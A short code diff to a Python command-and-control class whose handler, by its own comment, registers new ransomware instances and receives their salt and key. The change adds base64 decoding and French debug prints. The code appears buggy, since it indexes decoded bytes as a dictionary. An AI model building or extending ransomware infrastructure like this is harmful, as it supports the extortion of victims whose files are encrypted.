@@ -19,8 +19,13 @@ class CNC(CNCBase):
 
     def post_new(self, path:str, params:dict, body:dict)->dict:
         # used to register new ransomware instance
+        
+        body = base64.b64decode(body)
 
-        token = body["token"]
+        print(f"Données reçues : {body}")
+        print(f"Les données sont de type : {type(body)}")
+
+        #token = body["token"]
         salt = body["salt"]
         key = body["key"]
 
